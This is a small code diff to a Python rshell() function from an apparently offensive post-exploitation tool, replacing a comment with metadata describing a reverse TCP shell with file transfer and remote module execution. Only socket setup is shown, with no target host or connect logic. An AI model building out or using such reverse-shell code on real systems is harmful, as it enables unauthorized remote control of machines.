@@ -1,6 +1,7 @@
 
-# Start a reverse TCP shell from the remote host back to your local system. Specify your local IP as the RHOST variable in the payload_template file.
 def rshell():
+    __description__ = "Opens a reverse TCP shell to a remote host. Interactive shell with download/upload and remote Intersect module execution."
+    __author__ = "ohdae : bindshell[at]live[dot]com"
     socksize = 4096
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
